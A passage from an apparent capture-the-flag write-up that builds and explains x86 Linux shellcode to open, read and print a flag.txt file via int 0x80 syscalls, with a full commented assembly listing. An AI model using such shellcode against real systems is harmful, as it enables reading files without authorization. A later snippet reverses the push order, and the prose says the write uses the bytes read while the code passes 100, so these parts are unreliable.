📖 Step 2: Architecture Analysis

Before writing the shellcode, I needed to understand the execution environment:

Architecture: x86 (32-bit)
Syscall Interface: Linux int 0x80
Input Format: Base64-encoded assembly text
Goal: Read and print the flag.txt file

In Linux x86 (32-bit), system calls are made using the int 0x80 interrupt. The syscall number goes in eax, and arguments go in ebx, ecx, edx, etc.

Key syscalls we'll need:

  • open() - syscall #5: Open a file
  • read() - syscall #3: Read from file descriptor
  • write() - syscall #4: Write to file descriptor (stdout)
  • exit() - syscall #1: Exit cleanly

⚙️ Step 3: Crafting the Shellcode

Now I needed to write assembly code that would:

  1. Open the file "flag.txt"
  2. Read its contents
  3. Write the contents to stdout
  4. Exit cleanly

🔧 Complete Shellcode Breakdown

; Phase 1: Prepare filename string "flag.txt"
xor eax,eax ; Zero out eax (we'll use it multiple times)
push eax ; Push null terminator for string
push 0x7478742e ; Push ".txt" (little-endian: .txt)
push 0x67616c66 ; Push "flag" (little-endian: flag)
mov ebx,esp ; ebx now points to "flag.txt\0" on stack

; Phase 2: Open the file (syscall 5 = open)
mov eax,5 ; syscall number for open()
xor ecx,ecx ; flags = 0 (O_RDONLY)
int 0x80 ; Execute syscall - returns fd in eax

; Phase 3: Read from file (syscall 3 = read)
mov ebx,eax ; Move file descriptor to ebx
mov eax,3 ; syscall number for read()
mov ecx,esp ; Buffer = current stack position
mov edx,100 ; Read up to 100 bytes
int 0x80 ; Execute syscall - reads file into buffer

; Phase 4: Write to stdout (syscall 4 = write)
mov eax,4 ; syscall number for write()
mov ebx,1 ; fd = 1 (stdout)
int 0x80 ; Execute syscall - prints buffer to screen

; Phase 5: Exit cleanly (syscall 1 = exit)
mov eax,1 ; syscall number for exit()
xor ebx,ebx ; exit code = 0 (success)
int 0x80 ; Execute syscall - terminates program

🧠 How It Works

Phase 1 - String Construction: We build "flag.txt\0" on the stack by pushing bytes in reverse order (little-endian). The string is null-terminated and ebx points to it.

Phase 2 - File Opening: We call open("flag.txt", O_RDONLY) which returns a file descriptor in eax.

Phase 3 - Reading: We call read(fd, buffer, 100) to read the flag content into our stack buffer.

Phase 4 - Writing: We call write(1, buffer, bytes_read) to print the flag to stdout (fd=1).

Phase 5 - Clean Exit: We call exit(0) to terminate gracefully.

🔧 Technical Deep Dive

Understanding x86 Linux Syscalls

In 32-bit Linux, system calls use the int 0x80 interrupt. The calling convention is:

eax = syscall number
ebx = 1st argument
ecx = 2nd argument
edx = 3rd argument
esi = 4th argument
edi = 5th argument

Return value: eax

Common Syscalls Used

Syscall Number Signature
exit 1 exit(int status)
read 3 read(int fd, void *buf, size_t count)
write 4 write(int fd, const void *buf, size_t count)
open 5 open(const char *pathname, int flags)

Why Little-Endian Matters

When pushing strings onto the stack, we need to account for x86's little-endian byte order:

String: "flag.txt"

Split into 4-byte chunks:
"flag" = 0x66 0x6c 0x61 0x67
".txt" = 0x2e 0x74 0x78 0x74

Little-endian representation:
push 0x67616c66 ; "flag" reversed
push 0x7478742e ; ".txt" reversed

Alternative Shellcode Approaches

There are other ways to solve this challenge:

  • Using execve: Execute /bin/cat flag.txt
  • Using mmap: Memory-map the file and read directly
  • Using sendfile: Send file contents directly to stdout

However, the open-read-write approach is the most straightforward and reliable for this challenge.
